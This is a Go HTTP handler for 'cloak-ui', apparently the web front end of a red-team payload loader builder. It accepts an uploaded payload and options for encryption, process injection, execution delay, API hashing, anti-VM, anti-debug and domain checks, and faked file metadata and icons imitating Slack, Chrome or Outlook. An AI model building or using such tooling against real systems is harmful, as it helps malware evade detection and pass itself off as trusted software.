package api

import (
	"bytes"
	"cloak-ui/api/transport"
	"fmt"
	"io"
	"net/http"
	"slices"
	"strconv"
	"strings"
)

var (
	validIcons []string = []string{"slack", "chrome", "firefox", "edge", "outlook", "none"}
)

func FormToJson(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		w.Write([]byte("only POST method allowed"))

		return
	}

	// get form data
	err := r.ParseMultipartForm(16384)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(err.Error()))

		return
	}

	var (
		execDelay     int    = 0
		doApiHashing  bool   = false
		checkHostname bool   = false
		checkVm       bool   = false
		checkDebug    bool   = false
		debug         bool   = false
		fVersion      string = "1.0.0.0"
		exportFunc    string = ""
		outName       string = "cloak"
		// checkDomainName   bool = false
		checkDomainJoined bool = false
		// checkSubnet       bool = false
	)

	/*
		Begin Error Checking
	*/

	// check for valid encryption
	if r.FormValue("payload-encoding") == "invalid" {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Payload Encoding/Encyrption cannot be empty"))

		return
	}

	// check for valid output format
	if r.FormValue("output-format") == "invalid" {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Output Format cannot be empty"))

		return
	}

	// check for valid exec-method
	if r.FormValue("exec-method") == "invalid" {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Execution Method cannot be empty"))

		return
	}

	// check for valid inject-method if "inject" is the exec-method
	if r.FormValue("exec-method") == "invalid" && r.FormValue("exec-method") == "inject" {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Injection Method cannot be empty"))

		return
	}

	// set exec delay to 0 if empty
	if r.FormValue("exec-delay") == "" {
		execDelay = 0
	} else {
		// convert exec-delay to int
		execDelay, err = strconv.Atoi(r.FormValue("exec-delay"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("Execution Delay must be an integer"))

			return
		}
	}

	// check for hostname if box checked
	if r.FormValue("check-hostname") == "true" && r.FormValue("hostname-to-check") == "" {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Hostname cannot be empty"))

		return
	}

	if r.FormValue("check-hostname") == "true" {
		checkHostname = true
	}

	if r.FormValue("api-hash") == "true" {
		doApiHashing = true
	}

	if r.FormValue("check-vm") == "true" {
		checkVm = true
	}

	if r.FormValue("check-debug") == "true" {
		checkDebug = true
	}

	if r.FormValue("debug") == "true" {
		debug = true
	}

	if r.FormValue("metadata") == "true" && !slices.Contains(validIcons, r.FormValue("icon")) {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("Invalid icon"))

		return
	}

	if r.FormValue("dll-name") == "" {
		exportFunc = "Start"
	} else {
		exportFunc = r.FormValue("dll-name")
	}
	fmt.Println(r.FormValue("dll-name"))

	// check for domain name if box checked
	// if r.FormValue("check-domain") == "true" && r.FormValue("domain-name-to-check") == "" {
	// 	w.WriteHeader(http.StatusBadRequest)
	// 	w.Write([]byte("Domain Name cannot be empty"))

	// 	return
	// }

	// if r.FormValue("check-domain") == "true" && r.FormValue("check-domain-joined") == "" {
	// 	checkDomainJoined = true
	// }

	// if r.FormValue("check-domain") == "true" {
	// 	checkDomainName = true
	// }

	// check for subnet if box checked
	// if r.FormValue("check-subnet") == "true" && r.FormValue("subnet-to-check") == "" {
	// 	w.WriteHeader(http.StatusBadRequest)
	// 	w.Write([]byte("Subnet cannot be empty"))

	// 	return
	// }

	// if r.FormValue("check-subnet") == "true" {
	// 	checkSubnet = true
	// }

	if r.FormValue("check-domain-joined") == "true" {
		checkDomainJoined = true
	}

	// check fileversion has value
	if r.FormValue("file-version") == "" {
		fVersion = "1,0,0,0"
	} else {
		fVersion = strings.Replace(r.FormValue("file-version"), ".", ",", -1)
	}

	if r.FormValue("out-name") != "" {
		outName = r.FormValue("out-name")
	}
	/*
		End Error Checking
	*/

	// get payload contents
	file, _, err := r.FormFile("payload-upload")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(err.Error()))

		return
	}
	defer file.Close()

	var buf bytes.Buffer
	io.Copy(&buf, file)

	// convert to json struct
	var generateJson transport.Generate = transport.Generate{
		Payload:           buf.Bytes(),
		EncryptionAlgo:    r.FormValue("payload-encoding"),
		OutputFormat:      r.FormValue("output-format"),
		OutputName:        outName,
		ExecutionMethod:   r.FormValue("exec-method"),
		InjectMethod:      r.FormValue("inject-method"),
		ExecDelay:         execDelay,
		CheckHostname:     checkHostname,
		CheckDomainJoined: checkDomainJoined,
		Hostname:          r.FormValue("hostname-to-check"),
		DoApiHashing:      doApiHashing,
		ExportedFunc:      exportFunc,
		CheckVm:           checkVm,
		CheckDebug:        checkDebug,
		Debug:             debug,
		FileVersion:       fVersion,
		CompanyName:       r.FormValue("company-name"),
		FileDescription:   r.FormValue("file-desc"),
		ProductName:       r.FormValue("product-name"),
		ProductVersion:    r.FormValue("product-version"),
		InternalName:      r.FormValue("internal-name"),
		OriginalFilename:  r.FormValue("og-filename"),
		Copyright:         r.FormValue("copyright"),
		Icon:              r.FormValue("icon"),
	}

	// send generate request
	payload, err := generate(generateJson)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(err.Error()))

		return
	} else {
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s.%s", generateJson.OutputName, generateJson.OutputFormat))
		w.Header().Set("Content-Type", "application/octet-stream")

		w.Write(payload)

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}

}
